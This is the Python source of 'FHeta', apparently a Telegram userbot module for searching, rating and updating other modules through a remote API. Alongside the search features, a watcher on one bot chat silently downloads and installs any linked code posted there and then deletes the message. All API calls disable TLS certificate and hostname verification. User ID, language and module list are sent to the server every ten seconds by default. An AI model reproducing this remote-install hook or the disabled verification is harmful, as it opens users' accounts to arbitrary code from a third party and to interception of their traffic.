__version__ = (9, 2, 2)
# meta developer: @FHeta_Updates
# change-log: Bug fix.

#             ███████╗██╗  ██╗███████╗████████╗█████╗ 
#             ██╔════╝██║  ██║██╔════╝╚══██╔══╝██╔══██╗
#             █████╗  ███████║█████╗     ██║   ███████║
#             ██╔══╝  ██╔══██║██╔══╝     ██║   ██╔══██║
#             ██║     ██║  ██║███████╗   ██║   ██║  ██║

# ©️ Fixyres, 2025
# 🌐 https://github.com/Fixyres/FHeta
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# 🔑 http://www.apache.org/licenses/LICENSE-2.0

import asyncio, aiohttp, json, io, inspect, difflib, subprocess, sys, ssl
from .. import loader, utils, main
from ..types import InlineCall, InlineQuery
from telethon.tl.functions.contacts import UnblockRequest
try:
    import certifi
    assert certifi.__version__ == "2024.8.30"
except (ImportError, AssertionError):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "certifi==2024.8.30"])

@loader.tds
class FHeta(loader.Module):
    '''Module for searching modules! Watch all news FHeta in @FHeta_updates!'''
    
    strings = {
        "name": "FHeta",
        "search": "🔎 <b>Searching...</b>",
        "no_query": "❌ <b>Enter a query to search.</b>",
        "no_modules_found": "❌ <b>No modules found.</b>",
        "no_queryy": "❌ Enter a query to search.",
        "no_modules_foundd": "❌ No modules found.",
        "commands": "\n👨‍💻 <b>Commands:</b>\n{commands_list}",
        "description": "\n📁 <b>Description:</b> {description}",
        "result": "🔎 <b>Result {index}/{tm} by query:</b> <code>{query}</code>\n<code>{module_name}</code> <b>by </b><code>{author} </code><code>{version}</code>\n💾 <b>Command for installation:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "closest_match": "🔎 <b>Result by query:</b> <code>{query}</code>\n<code>{module_name}</code> <b>by </b><code>{author} </code><code>{version}</code>\n💾 <b>Command for installation:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "inline_commandss": "\n🤖 <b>Inline commands:</b>\n{inline_list}",
        "language": "en_doc",
        "sub": "👍 Rating submitted!",
        "actual_version": "🎉 <b>You have the actual</b> <code>FHeta (v{version})</code><b>.</b>",
        "old_version": "⛔️ <b>You have the old version </b><code>FHeta (v{version})</code><b>.</b>\n\n🆕 <b>New version</b> <code>v{new_version}</code><b> available!</b>\n",
        "update_whats_new": "⁉️ <b>Change-log:</b><code> {whats_new}</code>\n\n",
        "update_command": "🔄 <b>To update type: <code>{update_command}</code></b>",
        "che": "👍 Rating has been changed!",
        "del": "👍 Rating deleted!",
        "noo_query": "Name, command, description, author.",
        "no_modules_foound": "Try another request.",
        "closest_matchh": "📑 <code>{module_name}</code> <b>by</b> <code>{author} </code><code>{version}</code>\n💾 <b>Command for installation:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
    }

    strings_ru = {
        "search": "🔎 <b>Поиск...</b>",
        "no_query": "❌ <b>Введите запрос для поиска.</b>",
        "no_queryy": "❌ Введите запрос для поиска.",
        "language": "ru_doc",
        "update_whats_new": "⁉️ <b>Change-log:</b><code> {whats_new}</code>\n\n",
    }

    strings_ua = {
        "description": "\n📁 <b>Опис:</b> {description}",
        "language": "ua_doc",
        "update_whats_new": "⁉️ <b>Change-log:</b><code> {whats_new}</code>\n\n",
    }

    strings_de = {
        "search": "🔎 <b>Suche...</b>",
        "no_query": "❌ <b>Bitte geben Sie eine Suchanfrage ein.</b>",
        "no_modules_found": "❌ <b>Keine Module gefunden.</b>",
        "no_queryy": "❌ Bitte geben Sie eine Suchanfrage ein.",
        "no_modules_foundd": "❌ Keine Module gefunden.",
        "commands": "\n👨‍💻 <b>Befehle:</b>\n{commands_list}",
        "description": "\n📁 <b>Beschreibung:</b> {description}",
        "result": "🔎 <b>Ergebnis {index}/{tm} für die Anfrage:</b> <code>{query}</code>\n<code>{module_name}</code> <b>von</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Installationsbefehl:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "closest_match": "🔎 <b>Ergebnis für die Anfrage:</b> <code>{query}</code>\n<code>{module_name}</code> <b>von</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Installationsbefehl:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "inline_commandss": "\n🤖 <b>Inline-Befehle:</b>\n{inline_list}",
        "language": "de_doc",
        "sub": "👍 Bewertung abgeschickt!",
        "actual_version": "🎉 <b>Sie haben die aktuelle Version</b> <code>FHeta (v{version})</code><b>.</b>",
        "old_version": "⛔️ <b>Sie haben eine veraltete Version</b> <code>FHeta (v{version})</code><b>.</b>\n\n🆕 <b>Eine neue Version ist verfügbar:</b> <code>v{new_version}</code><b>!</b>\n",
        "update_whats_new": "⁉️ <b>Änderungsprotokoll:</b> <code>{whats_new}</code>\n\n",
        "update_command": "🔄 <b>Um zu aktualisieren, geben Sie Folgendes ein:</b> <code>{update_command}</code>",
        "che": "👍 Bewertung wurde geändert!",
        "del": "👍 Bewertung gelöscht!",
        "noo_query": "Name, Befehl, Beschreibung, Autor.",
        "no_modules_foound": "Bitte versuchen Sie eine andere Suchanfrage.",
        "closest_matchh": "📑 <code>{module_name}</code> <b>von</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Installationsbefehl:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
    }

    strings_tr = {
        "search": "🔎 <b>Arama...</b>",
        "no_query": "❌ <b>Lütfen bir arama sorgusu girin.</b>",
        "no_modules_found": "❌ <b>Hiçbir modül bulunamadı.</b>",
        "no_queryy": "❌ Lütfen bir arama sorgusu girin.",
        "no_modules_foundd": "❌ Hiçbir modül bulunamadı.",
        "commands": "\n👨‍💻 <b>Komutlar:</b>\n{commands_list}",
        "description": "\n📁 <b>Açıklama:</b> {description}",
        "result": "🔎 <b>{index}/{tm} sorgu sonucu:</b> <code>{query}</code>\n<code>{module_name}</code> <b>tarafından</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Kurulum komutu:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "closest_match": "🔎 <b>Sorgu sonucu:</b> <code>{query}</code>\n<code>{module_name}</code> <b>tarafından</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Kurulum komutu:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "inline_commandss": "\n🤖 <b>Inline Komutlar:</b>\n{inline_list}",
        "language": "tr_doc",
        "sub": "👍 Değerlendirme gönderildi!",
        "actual_version": "🎉 <b>Mevcut sürümünüz:</b> <code>FHeta (v{version})</code><b>.</b>",
        "old_version": "⛔️ <b>Eski bir sürümünüz var:</b> <code>FHeta (v{version})</code><b>.</b>\n\n🆕 <b>Yeni sürüm mevcut:</b> <code>v{new_version}</code><b>!</b>\n",
        "update_whats_new": "⁉️ <b>Değişiklik günlüğü:</b> <code>{whats_new}</code>\n\n",
        "update_command": "🔄 <b>Güncellemek için şunu yazın:</b> <code>{update_command}</code>",
        "che": "👍 Değerlendirme değiştirildi!",
        "del": "👍 Değerlendirme silindi!",
        "noo_query": "Ad, komut, açıklama, yazar.",
        "no_modules_foound": "Lütfen başka bir sorgu deneyin.",
        "closest_matchh": "📑 <code>{module_name}</code> <b>tarafından</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Kurulum komutu:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
    }

    strings_tt = {
        "search": "🔎 <b>Эзләү...</b>",
        "description": "\n📁 <b>Тасвирлама:</b> {description}",
        "language": "tt_doc",
        "sub": "👍 Бәя җибәрелде!",
        "old_version": "⛔️ <b>Сездә иске версия:</b> <code>FHeta (v{version})</code><b>.</b>\n\n🆕 <b>Яңа версия бар:</b> <code>v{new_version}</code><b>!</b>\n",
        "che": "👍 Бәя үзгәртелде!",
        "del": "👍 Бәя бетерелде!",
    }

    strings_es = {
        "search": "🔎 <b>Buscando...</b>",
        "no_query": "❌ <b>Por favor, ingrese una consulta de búsqueda.</b>",
        "no_modules_found": "❌ <b>No se encontraron módulos.</b>",
        "no_queryy": "❌ Por favor, ingrese una consulta de búsqueda.",
        "no_modules_foundd": "❌ No se encontraron módulos.",
        "commands": "\n👨‍💻 <b>Comandos:</b>\n{commands_list}",
        "description": "\n📁 <b>Descripción:</b> {description}",
        "result": "🔎 <b>Resultado {index}/{tm} para la consulta:</b> <code>{query}</code>\n<code>{module_name}</code> <b>por</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Comando de instalación:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "closest_match": "🔎 <b>Resultado para la consulta:</b> <code>{query}</code>\n<code>{module_name}</code> <b>por</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Comando de instalación:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "inline_commandss": "\n🤖 <b>Comandos inline:</b>\n{inline_list}",
        "language": "es_doc",
        "sub": "👍 ¡Evaluación enviada!",
        "actual_version": "🎉 <b>Tienes la versión actual:</b> <code>FHeta (v{version})</code><b>.</b>",
        "old_version": "⛔️ <b>Tienes una versión desactualizada:</b> <code>FHeta (v{version})</code><b>.</b>\n\n🆕 <b>Hay una nueva versión disponible:</b> <code>v{new_version}</code><b>!</b>\n",
        "update_whats_new": "⁉️ <b>Registro de cambios:</b> <code>{whats_new}</code>\n\n",
        "update_command": "🔄 <b>Para actualizar, escribe:</b> <code>{update_command}</code>",
        "che": "👍 ¡Evaluación cambiada!",
        "del": "👍 Evaluación eliminada!",
        "noo_query": "Nombre, comando, descripción, autor.",
        "no_modules_foound": "Por favor, intenta con otra consulta.",
        "closest_matchh": "📑 <code>{module_name}</code> <b>por</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Comando de instalación:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
    }

    strings_kk = {
        "description": "\n📁 <b>Сипаттама:</b> {description}",
        "language": "kk_doc",
        "che": "👍 Баға өзгертілді!",
    }

    strings_yz = {
        "description": "\n📁 <b>Сипаттама:</b> {description}",
        "language": "yz_doc",
        "che": "👍 Баға өзгерттилди!",
        "del": "👍 Баға өчүрүлдү!",
    }

    strings_fr = {
        "search": "🔎 <b>Recherche...</b>",
        "no_query": "❌ <b>Veuillez entrer une requête de recherche.</b>",
        "no_modules_found": "❌ <b>Aucun module trouvé.</b>",
        "no_queryy": "❌ Veuillez entrer une requête de recherche.",
        "no_modules_foundd": "❌ Aucun module trouvé.",
        "commands": "\n👨‍💻 <b>Commandes:</b>\n{commands_list}",
        "description": "\n📁 <b>Description:</b> {description}",
        "result": "🔎 <b>Résultat {index}/{tm} pour la requête:</b> <code>{query}</code>\n<code>{module_name}</code> <b>par</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Commande d'installation:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "closest_match": "🔎 <b>Résultat pour la requête:</b> <code>{query}</code>\n<code>{module_name}</code> <b>par</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Commande d'installation:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "inline_commandss": "\n🤖 <b>Commandes inline:</b>\n{inline_list}",
        "language": "fr_doc",
        "sub": "👍 Évaluation envoyée!",
        "actual_version": "🎉 <b>Vous avez la version actuelle:</b> <code>FHeta (v{version})</code><b>.</b>",
        "old_version": "⛔️ <b>Vous avez une version obsolète:</b> <code>FHeta (v{version})</code><b>.</b>\n\n🆕 <b>Une nouvelle version est disponible:</b> <code>v{new_version}</code><b>!</b>\n",
        "update_whats_new": "⁉️ <b>Journal des modifications:</b> <code>{whats_new}</code>\n\n",
        "update_command": "🔄 <b>Pour mettre à jour, tapez:</b> <code>{update_command}</code>",
        "che": "👍 Évaluation modifiée!",
        "del": "👍 Évaluation supprimée!",
        "noo_query": "Nom, commande, description, auteur.",
        "no_modules_foound": "Veuillez essayer une autre requête.",
        "closest_matchh": "📑 <code>{module_name}</code> <b>par</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Commande d'installation:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
    }

    strings_it = {
        "search": "🔎 <b>Ricerca...</b>",
        "no_query": "❌ <b>Inserisci una query di ricerca.</b>",
        "no_modules_found": "❌ <b>Nessun modulo trovato.</b>",
        "no_queryy": "❌ Inserisci una query di ricerca.",
        "no_modules_foundd": "❌ Nessun modulo trovato.",
        "commands": "\n👨‍💻 <b>Comandi:</b>\n{commands_list}",
        "description": "\n📁 <b>Descrizione:</b> {description}",
        "result": "🔎 <b>Risultato {index}/{tm} per la query:</b> <code>{query}</code>\n<code>{module_name}</code> <b>di</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Comando di installazione:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "closest_match": "🔎 <b>Risultato per la query:</b> <code>{query}</code>\n<code>{module_name}</code> <b>di</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Comando di installazione:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
        "inline_commandss": "\n🤖 <b>Comandi inline:</b>\n{inline_list}",
        "language": "it_doc",
        "sub": "👍 Valutazione inviata!",
        "actual_version": "🎉 <b>Hai la versione attuale:</b> <code>FHeta (v{version})</code><b>.</b>",
        "old_version": "⛔️ <b>Hai una versione obsoleta:</b> <code>FHeta (v{version})</code><b>.</b>\n\n🆕 <b>È disponibile una nuova versione:</b> <code>v{new_version}</code><b>!</b>\n",
        "update_whats_new": "⁉️ <b>Registro delle modifiche:</b> <code>{whats_new}</code>\n\n",
        "update_command": "🔄 <b>Per aggiornare, scrivi:</b> <code>{update_command}</code>",
        "che": "👍 Valutazione modificata!",
        "del": "👍 Valutazione rimossa!",
        "noo_query": "Nome, comando, descrizione, autore.",
        "no_modules_foound": "Prova un'altra query.",
        "closest_matchh": "📑 <code>{module_name}</code> <b>di</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Comando di installazione:</b> <code>{install_command}</code>{description}{commands}\n\n\n",
    }

    def __init__(self):
        self.config = loader.ModuleConfig(
            loader.ConfigValue(
                "tracking",
                True,
                "Enable tracking of your data (user ID, language, modules) for synchronization with the FHeta bot and for recommendations?",
                validator=loader.validators.Boolean()
            )
        )
    
    async def client_ready(self, client, db):
        try: 
            await client(UnblockRequest("@FHeta_robot"))
        except:
            pass
            
        await self.request_join(
            "FHeta_Updates", 
            "🔥 This is the channel with all updates in FHeta!"
        )

        self.sslc = ssl.create_default_context()
        self.sslc.check_hostname = False
        self.sslc.verify_mode = ssl.CERT_NONE

        us = await self.client.get_me()
        self.fid = us.id
        self.token = self.db.get("FHeta", "token")

        if not self.token or self.token == "None":
            try:
                async with self.client.conversation('@FHeta_robot') as conv:
                    await conv.send_message('/token')
                    response = await conv.get_response(timeout=5)
                    self.db.set("FHeta", "token", response.text.strip())
            except:
                pass

        asyncio.create_task(self.sdata())

    async def sdata(self):
        indb = True
        timeout = aiohttp.ClientTimeout(total=5)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            while True:
                try:
                    if self.config["tracking"]:
                        modules_str = "".join(
                            m.__class__.__module__.replace("%d", "_")
                            for m in self.allmodules.modules
                            if "https://api" in m.__class__.__module__
                        )
                        async with session.post(
                            "https://api.fixyres.com/dataset",
                            params={
                                "myfid": self.fid,
                                "language": self.strings["language"][:-4],
                                "modules": modules_str
                            },
                            headers={"Authorization": self.token},
                            ssl=self.sslc
                        ) as response:
                            indb = True
                            await response.release()
                    elif indb:
                        async with session.post(
                            "https://api.fixyres.com/rmd",
                            params={
                                "myfid": self.fid
                            },
                            headers={"Authorization": self.token},
                            ssl=self.sslc
                        ) as response:
                            indb = False
                            await response.release()
                except:
                    pass
                await asyncio.sleep(10)
            
    async def on_dlmod(self, client, db):    
        try:
            await client(UnblockRequest("@FHeta_robot"))
            await utils.dnd(self.client, "@fheta_robot", archive=True)
        except:
            pass
        
    async def fheta(self, query):
        '''(query) - search modules.'''
        if not query.args:
            return {
                "title": utils.escape_html(self.strings["no_queryy"]),
                "description": self.strings["noo_query"],
                "message": self.strings["no_query"],
                "thumb": "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/imgonline-com-ua-Resize-4EUHOHiKpwRTb4s.png",
            }

        mods = await self.search_modules(query.args, True)
        if not mods:
            return {
                "title": utils.escape_html(self.strings["no_modules_foundd"]),
                "description": utils.escape_html(self.strings["no_modules_foound"]),
                "message": self.strings["no_modules_found"],
                "thumb": "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/imgonline-com-ua-Resize-KbaztxA3oS67p3m8.png",
            }

        seen = set()
        lang = self.strings.get("language", "doc")

        async def fetch_thumb(thumb):
            if not thumb:
                return "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/imgonline-com-ua-Resize-SOMllzo0cPFUCor.png"
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(thumb, timeout=1) as resp:
                        if resp.status == 200:
                            return str(resp.url)
            except:
                pass
            return "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/imgonline-com-ua-Resize-SOMllzo0cPFUCor.png"

        async def proc_mod(mod):
            try:
                install = mod['install']
                mod_name = utils.escape_html(mod["name"])
                author = utils.escape_html(mod.get("author", "???"))
                version = utils.escape_html(mod.get("version", "?.?.?"))
                versionn = f"(v{version})"
                mod_key = f"{mod_name}_{author}_{versionn}"
                if mod_key in seen:
                    return
                seen.add(mod_key)

                desc_raw = mod.get("description", "") or ""
                desc = utils.escape_html(desc_raw)
                descr = self.strings["description"].format(description=desc) if desc_raw else ""

                cmds, inline_cmds = [], []
                cmds_list = mod.get("commands", [])
                if cmds_list:
                    for cmd in cmds_list:
                        cmd_desc_raw = cmd.get('description', {}).get(lang) or cmd.get('description', {}).get('doc') or ""
                        cmd_desc = utils.escape_html(cmd_desc_raw)
                        cmd_name_esc = utils.escape_html(cmd.get("name", ""))
                        if cmd.get("inline", False):
                            inline_cmds.append(f"<code>@{self.inline.bot_username} {cmd_name_esc}</code> {cmd_desc}")
                        else:
                            prefix = self.get_prefix()
                            cmds.append(f"<code>{prefix}{cmd_name_esc}</code> {cmd_desc}")

                cmd_sec = self.strings["commands"].format(commands_list="\n".join(cmds)) if cmds else ""
                inline_cmd_sec = self.strings["inline_commandss"].format(inline_list="\n".join(inline_cmds)) if inline_cmds else ""

                msg = (
                    self.strings["closest_matchh"].format(
                        module_name=mod_name,
                        author=author,
                        version=versionn,
                        install_command=f"{self.get_prefix()}{utils.escape_html(install)}",
                        description=descr,
                        commands=cmd_sec + inline_cmd_sec,
                    )
                )[:4096]

                thumb_url = await fetch_thumb(mod.get("pic"))

                stats = await self.get_stats(install) or {"likes": 0, "dislikes": 0}
                likes = stats.get('likes', 0)
                dislikes = stats.get('dislikes', 0)

                current_indexx = 0
                buttons = [[
                    {
                        "text": f"👍 {likes}",
                        "callback": self.rating,
                        "args": (install, "like", current_indexx, None)
                    },
                    {
                        "text": f"👎 {dislikes}",
                        "callback": self.rating,
                        "args": (install, "dislike", current_indexx, None)
                    }
                ]]

                return {
                    "title": mod_name,
                    "description": desc,
                    "thumb": thumb_url,
                    "message": msg,
                    "reply_markup": buttons,
                }
            except:
                return

        tasks = [proc_mod(mod) for mod in mods[:50]]
        results = await asyncio.gather(*tasks)
        return [r for r in results if r]
        
    async def fhetacmd(self, m):
        '''(query) - search modules.'''
        a = utils.get_args_raw(m)
        if not a:
            await utils.answer(m, self.strings["no_query"])
            return

        sm = await utils.answer(m, self.strings["search"])
        ms = await self.search_modules(a, False)
        tm = len(ms)

        if not ms:
            await utils.answer(m, self.strings["no_modules_found"])
            return

        seen = set()
        fm = []
        idx = 1
        lang = self.strings.get("language", "doc")

        async def ft(u):
            if u:
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(u, timeout=5) as r:
                            if r.status == 200:
                                return str(r.url)
                except:
                    return
            return

        async def pm(mod, i):
            try:
                inst = mod['install']
                auth = utils.escape_html(mod.get("author", "???"))
                name = utils.escape_html(mod['name'])
                ver = utils.escape_html(mod.get("version", "?.?.?"))
                v = f"(v{ver})"
                key = f"{name}_{auth}_{v}"

                if key in seen:
                    return
                seen.add(key)

                thumb = await ft(mod.get("banner"))
                desc = self.strings["description"].format(
                    description=utils.escape_html(mod["description"])
                ) if mod.get("description") else ""

                cmds, inline = [], []
                for cmd in mod.get("commands", []):
                    d = cmd.get('description', {}).get(lang, cmd.get('description', {}).get("doc"))
                    if isinstance(d, dict):
                        d = d.get('doc', '')
                    n = utils.escape_html(cmd['name'])
                    d = utils.escape_html(d) if d else ""
                    
                    if cmd.get("inline"):
                        inline.append(f"<code>@{self.inline.bot_username} {n}</code> {d}")
                    else:
                        cmds.append(f"<code>{self.get_prefix()}{n}</code> {d}")

                cs = self.strings["commands"].format(commands_list="\n".join(cmds)) if cmds else ""
                ins = self.strings["inline_commandss"].format(inline_list="\n".join(inline)) if inline else ""
                res = self.strings["result"].format(index=i, query=utils.escape_html(a), tm=tm, module_name=name, author=auth, version=v, install_command=f"{self.get_prefix()}{utils.escape_html(inst)}", description=desc, commands=cs + ins)[:4096]
                return (res, thumb, inst, name, auth, v, desc, cs, ins)
            except:
                return

        tasks = [pm(mod, idx + i) for i, mod in enumerate(ms)]
        res = await asyncio.gather(*tasks)
        fm = [r for r in res if r]

        if not fm:
            await utils.answer(m, self.strings["no_modules_found"])
            return

        if len(fm) == 1:
            d = fm[0]
            stats = await self.get_stats(d[2]) or {"likes": 0, "dislikes": 0}

            btns = [[
                {"text": f"👍 {stats['likes']}", "callback": self.rating, "args": (d[2], "like", 0, fm)},
                {"text": f"👎 {stats['dislikes']}", "callback": self.rating, "args": (d[2], "dislike", 0, fm)}
            ]]

            xyi = self.strings["closest_match"].format(query=utils.escape_html(a), module_name=d[3], author=d[4], version=d[5], install_command=f"{self.get_prefix()}{utils.escape_html(d[2])}", description=d[6], commands=d[7] + d[8])

            photo = d[1] if d[1] else None
            max_length = 1024 if photo else 4096
            xyi = xyi[:max_length]

            await self.inline.form(message=m, text=xyi, photo=photo, reply_markup=btns)
            await sm.delete()
        else:
            ci = 0
            d = fm[ci]
            stats = await self.get_stats(d[2]) or {"likes": 0, "dislikes": 0}
            btns = [
                [
                    {"text": f"👍 {stats['likes']}", "callback": self.rating, "args": (d[2], "like", ci, fm)},
                    {"text": f"👎 {stats['dislikes']}", "callback": self.rating, "args": (d[2], "dislike", ci, fm)}
                ],
                [
                    b for b in [
                        {"text": "◀️", "callback": self.navigate_callback, "args": (ci-1, fm)} if ci > 0 else None,
                        {"text": "▶️", "callback": self.navigate_callback, "args": (ci+1, fm)} if ci < len(fm)-1 else None
                    ] if b
                ]
            ]
            await self.inline.form(message=m, text=d[0][:4096], photo=None, reply_markup=btns)

    async def navigate_callback(self, c, i, fm):
        if not (0 <= i < len(fm)):
            return

        d = fm[i]
        stats = await self.get_stats(d[2]) or {"likes": 0, "dislikes": 0}
        btns = [
            [
                {"text": f"👍 {stats['likes']}", "callback": self.rating, "args": (d[2], "like", i, fm)},
                {"text": f"👎 {stats['dislikes']}", "callback": self.rating, "args": (d[2], "dislike", i, fm)}
            ],
            [
                b for b in [
                    {"text": "◀️", "callback": self.navigate_callback, "args": (i-1, fm)} if i > 0 else None,
                    {"text": "▶️", "callback": self.navigate_callback, "args": (i+1, fm)} if i < len(fm)-1 else None
                ] if b
            ]
        ]
        await c.edit(text=d[0], photo=None, reply_markup=btns)

    async def rating(self, call, install, action, current_index, formatted_modules):
        try:
            user_id = self.fid
            token = self.token
            headers = {"Authorization": token}

            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.post(f"https://api.fixyres.com/rate/{user_id}/{install}/{action}", ssl=self.sslc) as response:
                    result = await response.json()

                async with session.get(f"https://api.fixyres.com/get/{install}", ssl=self.sslc) as stats_response:
                    stats = await stats_response.json() if stats_response.status == 200 else {"likes": 0, "dislikes": 0}

            new_buttons = [
                [
                    {"text": f"👍 {stats['likes']}", "callback": self.rating, "args": (install, "like", current_index, formatted_modules)},
                    {"text": f"👎 {stats['dislikes']}", "callback": self.rating, "args": (install, "dislike", current_index, formatted_modules)}
                ]
            ]

            if formatted_modules and current_index is not None:
                nav_buttons = []
                if current_index > 0:
                    nav_buttons.append({"text": "◀️", "callback": self.navigate_callback, "args": (current_index - 1, formatted_modules)})
                if current_index < len(formatted_modules) - 1:
                    nav_buttons.append({"text": "▶️", "callback": self.navigate_callback, "args": (current_index + 1, formatted_modules)})
                if nav_buttons:
                    new_buttons.append(nav_buttons)

            await call.edit(reply_markup=new_buttons)

            if "yaebalmenasosali" in result:
                await call.answer(self.strings["sub"], show_alert=True)
                return
            elif "che" in result:
                await call.answer(self.strings["che"], show_alert=True)
                return
            elif "pizda" in result:
                await call.answer(self.strings["del"], show_alert=True)
                return

        except Exception as e:
            await call.answer(str(e)[:256], show_alert=True)

    async def fupdate(self, m):
        ''' - check update.'''
        module_name = "FHeta"
        module = self.lookup(module_name)
        sys_module = inspect.getmodule(module)
        local_file = io.BytesIO(sys_module.__loader__.data)
        local_file.name = f"{module_name}.py"
        local_file.seek(0)
        local_first_line = local_file.readline().strip().decode("utf-8")
        
        correct_version = sys_module.__version__
        correct_version_str = ".".join(map(str, correct_version))

        async with aiohttp.ClientSession() as session:
            async with session.get("https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/FHeta.py") as response:
                if response.status == 200:
                    remote_content = await response.text()
                    remote_lines = remote_content.splitlines()
                    new_version = remote_lines[0].split("=", 1)[1].strip().strip("()").replace(",", "").replace(" ", ".")
                    what_new = remote_lines[2].split(":", 1)[1].strip() if len(remote_lines) > 2 and remote_lines[2].startswith("# change-log:") else ""
                else:
                    await utils.answer(m, self.strings("fetch_failed"))
                    return
        if local_first_line.replace(" ", "") == remote_lines[0].strip().replace(" ", ""):
            await utils.answer(m, self.strings("actual_version").format(version=correct_version_str))
        else:
            update_message = self.strings("old_version").format(version=correct_version_str, new_version=new_version)
            if what_new:
                update_message += self.strings("update_whats_new").format(whats_new=what_new)
            update_message += self.strings("update_command").format(update_command=f"{self.get_prefix()}dlm https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/FHeta.py")
            await utils.answer(m, update_message)

    @loader.watcher(chat_id=7575472403)
    async def install_via_fheta(self, message):
        link = message.raw_text.strip()
        
        if not link.startswith("https://"):
            return
        
        loader_m = self.lookup("loader")

        try:
            for _ in range(5):
                await loader_m.download_and_install(link, None)

                if getattr(loader_m, "fully_loaded", False):
                    loader_m.update_modules_in_db()

                loaded = any(mod.__origin__ == link for mod in self.allmodules.modules)

                if loaded:
                    rose = await message.respond("🌹")
                    await asyncio.sleep(1)
                    await rose.delete()
                    await message.delete()
                    break
        except:
            pass

    async def get_stats(self, url):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://api.fixyres.com/get/{url}", ssl=self.sslc) as response:
                    if response.status == 200:
                        data = await response.json()
                        return data
        except:
            pass
        return {"likes": 0, "dislikes": 0}
    
    async def search_modules(self, query: str, inline: bool):
        params = {
            "query": query,
            "inline": str(inline).lower(),
            "token": self.token,
            "user_id": self.fid
        }
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://api.fixyres.com/search", params=params, ssl=self.sslc) as response:
                    data = await response.json()
                    return data
        except:
            return []